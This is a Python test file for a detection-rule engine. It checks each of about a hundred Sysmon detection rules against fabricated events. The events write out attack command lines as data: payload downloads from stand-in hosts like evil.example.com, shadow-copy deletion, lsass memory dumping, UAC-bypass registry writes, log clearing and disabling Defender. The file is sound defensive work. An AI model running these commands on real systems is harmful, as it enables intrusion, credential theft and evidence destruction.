"""Rule corpus validation.

Every shipped rule is exercised against a true positive it must catch and, where
it matters, a true negative it must ignore. This is the detection-engineering
contract in test form: a rule that never fires is worse than no rule, because it
creates false confidence in coverage, and a rule that fires on everything trains
the analyst to ignore it.

Two real bugs were caught writing these cases: a `condition: any` cradle rule
that fired on every PowerShell process regardless of command line, and a regex
whose `\b` word boundary failed against a hyphenated `-urlcache` flag.
"""

from __future__ import annotations

import pytest

from backend.config import settings
from backend.engine.matcher import evaluate
from backend.engine.rule_loader import RuleStore
from backend.models.schemas import Event

KNOWN_FIELDS = {
    "image",
    "parent_image",
    "command_line",
    "parent_command_line",
    "process_guid",
    "parent_process_guid",
    "host",
}


@pytest.fixture(scope="module")
def rules() -> dict:
    """Load the real rule corpus once for the whole module."""
    store = RuleStore()
    store.load(settings.rules_dir)
    assert not store.errors, f"rules failed to load: {store.errors}"
    return {rule.id: rule for rule in store.all}


def event(event_id: int = 1, **fields) -> Event:
    """Build an event, routing unknown keys into raw so rules can address
    Sysmon fields like TargetObject or GrantedAccess."""
    known = {k: v for k, v in fields.items() if k in KNOWN_FIELDS}
    raw = {k: v for k, v in fields.items() if k not in KNOWN_FIELDS}
    return Event(event_id=event_id, raw=raw, **known)


# (rule_id, should_fire, event). Each rule has at least one positive and, where
# a false positive is plausible, a negative that must stay quiet.
CASES = [
    # The three founding rules, validated here alongside the rest.
    (
        "SYS-001",
        True,
        event(1, parent_image=r"C:\O\WINWORD.EXE", image=r"C:\W\cmd.exe"),
    ),
    (
        "SYS-001",
        False,
        event(1, parent_image=r"C:\W\explorer.exe", image=r"C:\W\cmd.exe"),
    ),
    (
        "SYS-002",
        True,
        event(
            1, image=r"C:\W\powershell.exe", command_line="powershell -enc " + "A" * 40
        ),
    ),
    (
        "SYS-002",
        False,
        event(1, image=r"C:\W\powershell.exe", command_line="powershell -File a.ps1"),
    ),
    ("SYS-010", True, event(10, TargetImage=r"C:\W\lsass.exe", GrantedAccess="0x1410")),
    (
        "SYS-010",
        False,
        event(10, TargetImage=r"C:\W\explorer.exe", GrantedAccess="0x1410"),
    ),
    # --- Ostap chain rules, validated against the real EVTX sample ---
    # --- WinPwnage url.dll LOLBin, validated against the real EVTX sample ---
    # --- IIS appcmd credential discovery, validated against the real EVTX ---
    (
        "SYS-038",
        True,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\appcmd.exe",
            command_line=r"appcmd list apppool /text:processmodel.password",
        ),
    ),
    (
        "SYS-038",
        True,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\appcmd.exe",
            command_line=r"appcmd list vdir /text:password",
        ),
    ),
    (
        "SYS-038",
        False,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\appcmd.exe",
            command_line=r"appcmd list apppool /text:physicalpath",
        ),
    ),
    (
        "SYS-039",
        True,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\appcmd.exe",
            parent_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="appcmd list apppool",
        ),
    ),
    (
        "SYS-039",
        False,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\appcmd.exe",
            parent_image=r"C:\Windows\explorer.exe",
            command_line="appcmd list apppool",
        ),
    ),
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32.exe  url.dll,OpenURL file://C:/Windows/system32/calc.exe",
        ),
    ),
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32.exe  url.dll,FileProtocolHandler file:///C:/programdata/calc.hta",
        ),
    ),
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r'"C:\Windows\System32\rundll32.exe" ieframe.dll,OpenURL c:\temp\x.url',
        ),
    ),
    (
        "SYS-037",
        False,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        ),
    ),
    # --- SYS-037 extension: three more LOLBAS exports, each validated against
    # a real EVTX (exec_sysmon_1_11_lolbin_rundll32_zipfldr_RouteTheCall.evtx,
    # exec_sysmon_1_lolbin_rundll32_advpack_RegisterOCX.evtx,
    # exec_sysmon_1_rundll32_pcwutl_LaunchApplication.evtx). ---
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"C:\Windows\System32\rundll32.exe zipfldr.dll,RouteTheCall c:\Windows\System32\calc.exe",
        ),
    ),
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"C:\Windows\System32\rundll32.exe  advpack.dll,RegisterOCX c:\Windows\System32\calc.exe",
        ),
    ),
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"C:\Windows\System32\rundll32.exe  pcwutl.dll,LaunchApplication c:\Windows\system32\calc.exe",
        ),
    ),
    (
        "SYS-034",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r'"C:\Windows\system32\rundll32.exe" Shell32.dll,Control_RunDLL "C:\Users\IEUser\Downloads\Invoice@0582.cpl",',
        ),
    ),
    (
        "SYS-034",
        True,
        event(
            1,
            image=r"C:\Windows\System32\control.exe",
            command_line=r'"C:\Windows\System32\control.exe" "C:\Users\IEUser\Downloads\Invoice@0582.cpl",',
        ),
    ),
    (
        "SYS-034",
        False,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r'"C:\Windows\System32\rundll32.exe" Shell32.dll,Control_RunDLL "C:\Windows\System32\main.cpl",',
        ),
    ),
    (
        "SYS-035",
        True,
        event(
            1,
            image=r"C:\Windows\System32\wscript.exe",
            command_line=r'"C:\Windows\System32\wscript.exe" /e:JScript.Encode /nologo C:\Users\IEUser\AppData\Local\Temp\info.txt',
        ),
    ),
    (
        "SYS-035",
        False,
        event(
            1,
            image=r"C:\Windows\System32\wscript.exe",
            command_line=r"wscript.exe C:\Scripts\backup.vbs",
        ),
    ),
    (
        "SYS-036",
        True,
        event(
            1,
            parent_image=r"C:\Windows\SysWOW64\rundll32.exe",
            image=r"C:\Windows\System32\wscript.exe",
            command_line="wscript.exe x",
        ),
    ),
    (
        "SYS-036",
        False,
        event(
            1,
            parent_image=r"C:\Windows\explorer.exe",
            image=r"C:\Windows\System32\wscript.exe",
            command_line="wscript.exe x",
        ),
    ),
    (
        "SYS-003",
        True,
        event(1, command_line=r"certutil -urlcache -f http://evil/x.exe x.exe"),
    ),
    ("SYS-003", True, event(1, command_line=r"mshta http://evil/a.hta")),
    ("SYS-003", False, event(1, command_line=r"certutil -hashfile C:\a.txt SHA256")),
    ("SYS-004", True, event(1, command_line=r"vssadmin delete shadows /all /quiet")),
    ("SYS-004", True, event(1, command_line=r"wmic shadowcopy delete")),
    ("SYS-004", False, event(1, command_line=r"vssadmin list shadows")),
    (
        "SYS-005",
        True,
        event(1, parent_image=r"C:\W\outlook.exe", image=r"C:\W\powershell.exe"),
    ),
    (
        "SYS-005",
        False,
        event(1, parent_image=r"C:\W\explorer.exe", image=r"C:\W\powershell.exe"),
    ),
    ("SYS-006", True, event(1, image=r"C:\Users\emma\AppData\Local\Temp\payload.exe")),
    ("SYS-006", False, event(1, image=r"C:\Program Files\app\app.exe")),
    ("SYS-007", True, event(1, image=r"C:\Users\emma\svchost.exe")),
    ("SYS-007", False, event(1, image=r"C:\Windows\System32\svchost.exe")),
    (
        "SYS-008",
        True,
        event(1, image=r"C:\W\rundll32.exe", command_line="rundll32.exe"),
    ),
    (
        "SYS-008",
        False,
        event(
            1,
            image=r"C:\W\rundll32.exe",
            command_line=r"rundll32.exe shell32.dll,Control_RunDLL",
        ),
    ),
    (
        "SYS-009",
        True,
        event(
            1,
            image=r"C:\W\powershell.exe",
            command_line=r"powershell iex (New-Object Net.WebClient).DownloadString('http://x')",
        ),
    ),
    (
        "SYS-009",
        False,
        event(1, image=r"C:\W\powershell.exe", command_line="powershell Get-ChildItem"),
    ),
    (
        "SYS-020",
        True,
        event(
            3,
            image=r"C:\W\powershell.exe",
            DestinationIp="1.2.3.4",
            DestinationPort="443",
        ),
    ),
    (
        "SYS-020",
        False,
        event(
            3, image=r"C:\W\chrome.exe", DestinationIp="1.2.3.4", DestinationPort="443"
        ),
    ),
    ("SYS-021", True, event(3, image=r"C:\W\svchost.exe", DestinationPort="4444")),
    ("SYS-021", False, event(3, image=r"C:\W\chrome.exe", DestinationPort="4444")),
    (
        "SYS-030",
        True,
        event(
            13, TargetObject=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\evil"
        ),
    ),
    ("SYS-030", False, event(13, TargetObject=r"HKLM\Software\App\Settings\Foo")),
    (
        "SYS-031",
        True,
        event(
            13,
            TargetObject=r"HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
        ),
    ),
    ("SYS-031", False, event(13, TargetObject=r"HKLM\Software\App\Foo")),
    (
        "SYS-032",
        True,
        event(
            13, TargetObject=r"HKLM\...\Image File Execution Options\sethc.exe\Debugger"
        ),
    ),
    (
        "SYS-032",
        False,
        event(
            13,
            TargetObject=r"HKLM\...\Image File Execution Options\notepad.exe\GlobalFlag",
        ),
    ),
    (
        "SYS-040",
        True,
        event(
            7,
            Image=r"C:\evil\loader.exe",
            ImageLoaded=r"C:\W\System.Management.Automation.dll",
        ),
    ),
    (
        "SYS-040",
        False,
        event(
            7,
            Image=r"C:\W\powershell.exe",
            ImageLoaded=r"C:\W\System.Management.Automation.dll",
        ),
    ),
    ("SYS-041", True, event(10, TargetImage=r"C:\W\lsass.exe", GrantedAccess="0x1410")),
    (
        "SYS-041",
        False,
        event(10, TargetImage=r"C:\W\lsass.exe", GrantedAccess="0x1000"),
    ),
    (
        "SYS-050",
        True,
        event(11, TargetFilename=r"C:\...\Start Menu\Programs\Startup\evil.exe"),
    ),
    ("SYS-050", False, event(11, TargetFilename=r"C:\Users\emma\Documents\a.txt")),
    (
        "SYS-051",
        True,
        event(
            11, Image=r"C:\O\WINWORD.EXE", TargetFilename=r"C:\Users\emma\AppData\a.ps1"
        ),
    ),
    (
        "SYS-051",
        False,
        event(11, Image=r"C:\O\WINWORD.EXE", TargetFilename=r"C:\Users\emma\doc.docx"),
    ),
    ("SYS-060", True, event(17, PipeName=r"\msagent_4f")),
    ("SYS-060", True, event(17, PipeName=r"\postex_1a2b")),
    ("SYS-060", False, event(17, PipeName=r"\lsass")),
    # --- WMI persistence: command-line staging (SYS-070) ---
    (
        "SYS-070",
        True,
        event(1, command_line=r"mofcomp.exe C:\Temp\evilsub.mof"),
    ),
    (
        "SYS-070",
        True,
        event(
            1,
            command_line=r"wmic /namespace:\\root\subscription PATH __EventFilter CREATE",
        ),
    ),
    ("SYS-070", False, event(1, command_line=r"wmic os get caption")),
    # --- WMI persistence: consumer registration (SYS-071), validated against
    # sysmon_20_21_1_CommandLineEventConsumer.evtx and wmighost_sysmon_20_21_1.evtx:
    # real Sysmon reports Type as the human-readable label ("Command Line",
    # "Script"), not the WMI class name the rule originally checked for. ---
    ("SYS-071", True, event(20, Type="Command Line")),
    ("SYS-071", True, event(20, Type="Script")),
    ("SYS-071", False, event(20, Type="Log File")),
    # --- PsExec named pipe (SYS-072) ---
    ("SYS-072", True, event(17, PipeName=r"\PSEXESVC")),
    ("SYS-072", True, event(17, PipeName=r"\PSEXESVC-1a2b-stdin")),
    ("SYS-072", False, event(17, PipeName=r"\lsass")),
    # --- PsExec service execution (SYS-073) ---
    (
        "SYS-073",
        True,
        event(1, image=r"C:\Windows\PSEXESVC.exe", command_line="PSEXESVC.exe"),
    ),
    (
        "SYS-073",
        True,
        event(
            1,
            image=r"C:\Tools\psexec.exe",
            command_line=r"psexec.exe -accepteula \\HOST cmd.exe",
        ),
    ),
    (
        "SYS-073",
        False,
        event(1, image=r"C:\Tools\psexec.exe", command_line=r"psexec.exe \\HOST cmd.exe"),
    ),
    # --- Regsvr32 Squiblydoo via scrobj.dll, independent of SYS-003 (SYS-074) ---
    (
        "SYS-074",
        True,
        event(
            1,
            image=r"C:\Windows\System32\regsvr32.exe",
            command_line=r"regsvr32.exe /s /u /i:evil.sct scrobj.dll",
        ),
    ),
    (
        "SYS-074",
        False,
        event(
            1,
            image=r"C:\Windows\System32\regsvr32.exe",
            command_line=r"regsvr32.exe C:\Program Files\App\legit.dll",
        ),
    ),
    # --- Certutil decode/encode, distinct from SYS-003's download check (SYS-075) ---
    (
        "SYS-075",
        True,
        event(
            1,
            image=r"C:\Windows\System32\certutil.exe",
            command_line=r"certutil.exe -decode payload.b64 payload.exe",
        ),
    ),
    (
        "SYS-075",
        False,
        event(
            1,
            image=r"C:\Windows\System32\certutil.exe",
            command_line=r"certutil.exe -hashfile C:\a.txt SHA256",
        ),
    ),
    # --- Start-BitsTransfer cmdlet, distinct from SYS-003's bitsadmin check (SYS-076) ---
    (
        "SYS-076",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=r"Start-BitsTransfer -Source http://evil/x.exe -Destination x.exe",
        ),
    ),
    (
        "SYS-076",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=r"Get-Process",
        ),
    ),
    # --- Unsigned driver load / BYOVD (SYS-077) ---
    ("SYS-077", True, event(6, ImageLoaded=r"C:\Windows\Temp\rtcore64.sys", Signed="false")),
    ("SYS-077", False, event(6, ImageLoaded=r"C:\Windows\System32\drivers\ndis.sys", Signed="true")),
    # --- Registry Run key written by wmiprvse.exe (SYS-078), validated
    # against wmi_remote_registry_sysmon.evtx: a remote WMI/DCOM connection
    # on port 135 followed by wmiprvse.exe writing exactly this key. ---
    (
        "SYS-078",
        True,
        event(
            13,
            image=r"C:\Windows\system32\wbem\wmiprvse.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\wmipers",
            Details="rundll32.exe a.dll, DllMain",
        ),
    ),
    (
        "SYS-078",
        False,
        event(
            13,
            image=r"C:\Windows\System32\msiexec.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SomeApp",
        ),
    ),
    # --- FTP client spawning a child process (SYS-079), validated against
    # exec_sysmon_1_ftp.evtx: ftp.exe -s:ftp.txt (WinPwnage's FTP execution
    # technique) spawning cmd.exe /C calc.exe. ---
    (
        "SYS-079",
        True,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            parent_image=r"C:\Windows\System32\ftp.exe",
            command_line=r"C:\Windows\system32\cmd.exe /C c:\Windows\system32\calc.exe",
        ),
    ),
    (
        "SYS-079",
        False,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            parent_image=r"C:\Windows\explorer.exe",
        ),
    ),
    # --- Ransom note dropped (SYS-080): the near-universal "how to
    # decrypt/recover" filename convention. ---
    (
        "SYS-080",
        True,
        event(11, TargetFilename=r"C:\Users\d.reyes\Desktop\HOW_TO_RECOVER_FILES.txt"),
    ),
    (
        "SYS-080",
        True,
        event(11, TargetFilename=r"C:\Users\d.reyes\Desktop\_readme.txt"),
    ),
    (
        "SYS-080",
        True,
        event(11, TargetFilename=r"C:\Users\d.reyes\Desktop\DECRYPT_INSTRUCTIONS.html"),
    ),
    (
        "SYS-080",
        False,
        event(11, TargetFilename=r"C:\Users\d.reyes\Documents\Q3_Forecast.xlsx"),
    ),
    # --- File written with a ransomware encryption extension (SYS-081):
    # fires per file, on the extension alone -- exactly what seed_rw.py's
    # mass-rename phase exercises. ---
    (
        "SYS-081",
        True,
        event(11, TargetFilename=r"C:\Shares\Finance\AP_Ledger.xlsx.locked"),
    ),
    (
        "SYS-081",
        True,
        event(11, TargetFilename=r"C:\Users\d.reyes\Documents\Board_Minutes.docx.crypted"),
    ),
    (
        "SYS-081",
        False,
        event(11, TargetFilename=r"C:\Users\d.reyes\Documents\Q3_Forecast.xlsx"),
    ),
    # --- Credential dumping via comsvcs.dll MiniDump (SYS-082), validated
    # against sysmon_10_1_memdump_comsvcs_minidump.evtx: rundll32 calling the
    # MiniDump export directly, target PID and dump path on the command line. ---
    (
        "SYS-082",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4868 C:\Windows\System32\notepad.bin full",
        ),
    ),
    (
        "SYS-082",
        False,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32.exe  url.dll,OpenURL file://C:/Windows/system32/calc.exe",
        ),
    ),
    # --- Fileless UAC bypass via registry hijack (SYS-083), validated against
    # three real samples: Sysmon_13_1_UACBypass_SDCLTBypass.evtx (exefile
    # shell\runas\command\IsolatedCommand), sysmon_1_13_UACBypass_AppPath_
    # Control.evtx (App Paths\control.exe), and
    # sysmon_13_1_compmgmtlauncherUACBypass.evtx (mscfile shell\open\command). ---
    (
        "SYS-083",
        True,
        event(
            13,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            TargetObject=r"HKU\S-1-5-21-1_CLASSES\exefile\shell\runas\command\IsolatedCommand",
            Details=r"C:\Windows\System32\cmd.exe /c notepad.exe",
        ),
    ),
    (
        "SYS-083",
        True,
        event(
            13,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            TargetObject=r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe\(Default)",
            Details=r"C:\windows\system32\cmd.exe",
        ),
    ),
    (
        "SYS-083",
        True,
        event(
            13,
            image=r"c:\python27\python.exe",
            TargetObject=r"HKU\S-1-5-21-1_CLASSES\mscfile\shell\open\command\(Default)",
            Details=r"c:\Windows\System32\cmd.exe",
        ),
    ),
    (
        "SYS-083",
        False,
        event(
            13,
            image=r"C:\Windows\System32\reg.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SomeApp",
            Details=r"C:\Program Files\App\app.exe",
        ),
    ),
    # --- CMSTP silent/auto-install execution (SYS-084), validated against
    # sysmon_1_13_11_cmstp_ini_uacbypass.evtx: cmstp.exe /au against a
    # WinPwnage-crafted .ini, a documented UAC-bypass and LOLBAS technique. ---
    (
        "SYS-084",
        True,
        event(
            1,
            image=r"C:\Windows\System32\cmstp.exe",
            command_line=r'"C:\Windows\System32\cmstp.exe" /au c:\users\ieuser\appdata\local\temp\tmp.ini',
        ),
    ),
    (
        "SYS-084",
        False,
        event(
            1,
            image=r"C:\Windows\System32\cmstp.exe",
            command_line=r'"C:\Windows\System32\cmstp.exe" C:\Users\ieuser\Documents\legit.CMP',
        ),
    ),
    # --- netsh portproxy port forwarding (SYS-085), validated against
    # de_portforward_netsh_rdp_sysmon_13_1.evtx: netsh writing a v4tov4 relay
    # rule that tunnels a listener port through to a remote RDP endpoint. ---
    (
        "SYS-085",
        True,
        event(
            13,
            image=r"C:\Windows\system32\netsh.exe",
            TargetObject=r"HKLM\System\CurrentControlSet\services\PortProxy\v4tov4\tcp\1.2.3.4/8001",
            Details="1.2.3.5/3389",
        ),
    ),
    (
        "SYS-085",
        False,
        event(
            13,
            image=r"C:\Windows\system32\netsh.exe",
            TargetObject=r"HKLM\System\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy",
        ),
    ),
    # --- PowerShell script block logging disabled (SYS-086), validated against
    # de_PsScriptBlockLogging_disabled_sysmon12_13.evtx: reg.exe zeroing the
    # EnableScriptBlockLogging policy value. ---
    (
        "SYS-086",
        True,
        event(
            13,
            image=r"C:\Windows\system32\reg.exe",
            TargetObject=r"HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging",
            Details="DWORD (0x00000000)",
        ),
    ),
    (
        "SYS-086",
        False,
        event(
            13,
            image=r"C:\Windows\system32\reg.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SomeApp",
        ),
    ),
    # --- PowerShell CLM lockdown policy removed (SYS-087), validated against
    # DE_Powershell_CLM_Disabled_Sysmon_12.evtx: powershell.exe deleting its own
    # __PSLockdownPolicy environment value. ---
    (
        "SYS-087",
        True,
        event(
            12,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            EventType="DeleteValue",
            TargetObject=r"HKLM\System\CurrentControlSet\Control\SESSION MANAGER\Environment\__PSLockdownPolicy",
        ),
    ),
    (
        "SYS-087",
        False,
        event(
            12,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            EventType="CreateKey",
            TargetObject=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer",
        ),
    ),
    # --- IIS worker process spawning a shell (SYS-088), validated against
    # LM_typical_IIS_webshell_sysmon_1_10_traces.evtx: w3wp.exe running the
    # DefaultAppPool identity spawning cmd.exe /c net user. ---
    (
        "SYS-088",
        True,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            parent_image=r"C:\Windows\System32\inetsrv\w3wp.exe",
            command_line=r'"c:\windows\system32\cmd.exe" /c net user',
        ),
    ),
    (
        "SYS-088",
        False,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\w3wp.exe",
            parent_image=r"C:\Windows\System32\services.exe",
        ),
    ),
    # --- SQL Server spawning a shell / xp_cmdshell (SYS-089), validated
    # against sysmon_1_exec_via_sql_xpcmdshell.evtx: sqlservr.exe (running as
    # the sqlsvc service account) spawning cmd.exe. ---
    (
        "SYS-089",
        True,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            parent_image=r"C:\Program Files\Microsoft SQL Server\MSSQL10.SQLEXPRESS\MSSQL\Binn\sqlservr.exe",
            command_line=r'"C:\Windows\system32\cmd.exe" /c set > c:\users\public\netstat.txt',
        ),
    ),
    (
        "SYS-089",
        False,
        event(
            1,
            image=r"C:\Program Files\Microsoft SQL Server\MSSQL10.SQLEXPRESS\MSSQL\Binn\sqlservr.exe",
            parent_image=r"C:\Windows\System32\services.exe",
        ),
    ),
    # --- Process spawned by the PS Remoting host (SYS-090), validated against
    # LM_PowershellRemoting_sysmon_1_wsmprovhost.evtx: wsmprovhost.exe (the
    # WinRM session host) spawning a command a remote operator sent. ---
    (
        "SYS-090",
        True,
        event(
            1,
            image=r"C:\Windows\System32\HOSTNAME.EXE",
            parent_image=r"C:\Windows\System32\wsmprovhost.exe",
        ),
    ),
    (
        "SYS-090",
        False,
        event(
            1,
            image=r"C:\Windows\System32\HOSTNAME.EXE",
            parent_image=r"C:\Windows\System32\cmd.exe",
        ),
    ),
    # --- Direct SAM manipulation (SYS-091), validated against
    # sysmon_local_account_creation_and_added_admingroup_12_13.evtx: lsass.exe
    # writing a new account's Names entry, then the Administrators alias. ---
    (
        "SYS-091",
        True,
        event(
            13,
            image=r"C:\windows\system32\lsass.exe",
            TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default)",
            Details="Binary Data",
        ),
    ),
    (
        "SYS-091",
        True,
        event(
            13,
            image=r"C:\windows\system32\lsass.exe",
            TargetObject=r"HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C",
            Details="Binary Data",
        ),
    ),
    (
        "SYS-091",
        False,
        event(
            13,
            image=r"C:\windows\system32\lsass.exe",
            TargetObject=r"HKLM\SAM\SAM\Domains\Account\F",
        ),
    ),
    # --- PE metadata masquerade (SYS-092), validated against
    # exec_emotet_sysmon_1.evtx: a payload named Dyxxur4gx.exe, staged under
    # AppData\Local\Temp, internally stamped OriginalFileName=CALC.EXE. ---
    (
        "SYS-092",
        True,
        event(
            1,
            image=r"C:\Users\Clippy\AppData\Local\Temp\WOrd\2019\Dyxxur4gx.exe",
            parent_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            OriginalFileName="CALC.EXE",
            Description="Windows Calculator",
            Company="Microsoft Corporation",
        ),
    ),
    (
        "SYS-092",
        False,
        event(
            1,
            image=r"C:\Windows\System32\calc.exe",
            OriginalFileName="CALC.EXE",
        ),
    ),
    (
        "SYS-092",
        False,
        event(
            1,
            image=r"C:\Users\Clippy\AppData\Local\Temp\WOrd\2019\Dyxxur4gx.exe",
            Description="Some legit installer",
        ),
    ),
    # --- SYS-093 through SYS-107: added in a coverage-expansion pass covering
    # techniques the corpus had no rule for at all (scheduled tasks, service
    # creation, remote-thread injection, firewall/log/AV tampering, staged
    # LOLBins, anti-forensic wiping, RDP enablement). ---
    (
        "SYS-093",
        True,
        event(
            1,
            image=r"C:\Windows\System32\schtasks.exe",
            command_line=r"schtasks /create /tn Updater /tr "
            r"C:\Users\bob\AppData\Roaming\u.exe /sc onlogon",
        ),
    ),
    (
        "SYS-093",
        False,
        event(1, image=r"C:\Windows\System32\schtasks.exe", command_line="schtasks /query"),
    ),
    (
        "SYS-094",
        True,
        event(
            13,
            TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Services\WinUpdSvc\ImagePath",
            Details=r"C:\Users\bob\AppData\Local\Temp\svc.exe",
            EventType="SetValue",
        ),
    ),
    (
        "SYS-094",
        False,
        event(
            13,
            TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Services\Spooler\ImagePath",
            Details=r"C:\Windows\System32\spoolsv.exe",
            EventType="SetValue",
        ),
    ),
    (
        "SYS-095",
        True,
        event(8, image=r"C:\Users\bob\mimikatz.exe", TargetImage=r"C:\Windows\System32\lsass.exe"),
    ),
    (
        "SYS-095",
        False,
        event(8, image=r"C:\Windows\System32\svchost.exe", TargetImage=r"C:\Windows\explorer.exe"),
    ),
    (
        "SYS-096",
        True,
        event(
            1,
            image=r"C:\Windows\System32\netsh.exe",
            command_line="netsh advfirewall firewall add rule name=Svc dir=in "
            "action=allow protocol=TCP localport=4444",
        ),
    ),
    (
        "SYS-096",
        False,
        event(
            1,
            image=r"C:\Windows\System32\netsh.exe",
            command_line="netsh advfirewall firewall add rule name=Svc dir=in "
            "action=block protocol=TCP localport=4444",
        ),
    ),
    (
        "SYS-097",
        True,
        event(1, image=r"C:\Windows\System32\wevtutil.exe", command_line="wevtutil cl Security"),
    ),
    (
        "SYS-097",
        False,
        event(
            1,
            image=r"C:\Windows\System32\wevtutil.exe",
            command_line="wevtutil qe Security /f:text",
        ),
    ),
    (
        "SYS-098",
        True,
        event(
            1,
            image=r"C:\Program Files\WinRAR\rar.exe",
            command_line=r"rar a -pSecret123 archive.rar C:\Users\bob\Documents",
        ),
    ),
    (
        "SYS-098",
        False,
        event(
            1,
            image=r"C:\Program Files\WinRAR\rar.exe",
            command_line=r"rar a archive.rar C:\Users\bob\Documents",
        ),
    ),
    (
        "SYS-099",
        True,
        event(
            1,
            image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe",
            command_line=r"InstallUtil.exe C:\Users\bob\AppData\Local\Temp\payload.dll",
        ),
    ),
    (
        "SYS-099",
        False,
        event(
            1,
            image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe",
            command_line=r"InstallUtil.exe C:\Program Files\MyApp\MyApp.exe",
        ),
    ),
    (
        "SYS-100",
        True,
        event(
            1,
            image=r"C:\Windows\System32\mshta.exe",
            command_line="mshta.exe http://evil.example.com/a.hta",
        ),
    ),
    (
        "SYS-100",
        False,
        event(
            1,
            image=r"C:\Windows\System32\mshta.exe",
            command_line=r"mshta.exe C:\Users\bob\Documents\local.hta",
        ),
    ),
    (
        "SYS-101",
        True,
        event(
            1,
            image=r"C:\Windows\hh.exe",
            command_line=r"hh.exe C:\Users\bob\AppData\Local\Temp\malicious.chm",
        ),
    ),
    (
        "SYS-101",
        False,
        event(
            1,
            image=r"C:\Windows\hh.exe",
            command_line=r"hh.exe C:\Windows\Help\mui\0409\ntbackup.chm",
        ),
    ),
    (
        "SYS-102",
        True,
        event(
            1,
            image=r"C:\Windows\System32\msiexec.exe",
            command_line="msiexec /i http://evil.example.com/pkg.msi",
        ),
    ),
    (
        "SYS-102",
        False,
        event(
            1,
            image=r"C:\Windows\System32\msiexec.exe",
            command_line=r"msiexec /i C:\Installers\pkg.msi",
        ),
    ),
    (
        "SYS-103",
        True,
        event(
            1,
            image=r"C:\Windows\System32\net.exe",
            command_line="net localgroup administrators bob /add",
        ),
    ),
    (
        "SYS-103",
        False,
        event(
            1,
            image=r"C:\Windows\System32\net.exe",
            command_line="net localgroup Users bob /add",
        ),
    ),
    (
        "SYS-104",
        True,
        event(1, image=r"C:\Windows\System32\sc.exe", command_line="sc stop WinDefend"),
    ),
    (
        "SYS-104",
        False,
        event(1, image=r"C:\Windows\System32\sc.exe", command_line="sc stop Spooler"),
    ),
    (
        "SYS-105",
        True,
        event(
            1,
            image=r"C:\Users\bob\Downloads\sdelete64.exe",
            command_line=r"sdelete64.exe -p 3 C:\evidence.txt",
        ),
    ),
    (
        "SYS-105",
        False,
        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe"),
    ),
    (
        "SYS-106",
        True,
        event(1, image=r"C:\Windows\System32\cipher.exe", command_line=r"cipher /w:C:\Temp"),
    ),
    (
        "SYS-106",
        False,
        event(1, image=r"C:\Windows\System32\cipher.exe", command_line=r"cipher /e C:\Secret"),
    ),
    (
        "SYS-107",
        True,
        event(
            13,
            TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections",
            Details="DWORD (0x00000000)",
            EventType="SetValue",
        ),
    ),
    (
        "SYS-107",
        False,
        event(
            13,
            TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections",
            Details="DWORD (0x00000001)",
            EventType="SetValue",
        ),
    ),
